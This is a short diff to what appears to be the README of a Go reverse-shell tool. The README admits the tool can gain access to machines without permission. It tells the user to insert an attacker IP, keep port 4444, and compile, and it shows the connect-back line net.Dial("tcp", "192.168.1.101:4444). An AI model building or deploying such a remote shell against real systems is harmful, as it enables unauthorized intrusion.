@@ -30,7 +30,10 @@ can be used for gain access into machines you don't have permissions. Please, al
   >  your attacker IP_MACHINE in the part "Put_attacker_ip_machine" and keep the port 4444.
  
 
-  expected :  >  net.Dial("tcp", "192.168.1.101:4444) 
+  expected :  
+
+
+  >  net.Dial("tcp", "192.168.1.101:4444) 
   
   
  Next that, compile with :
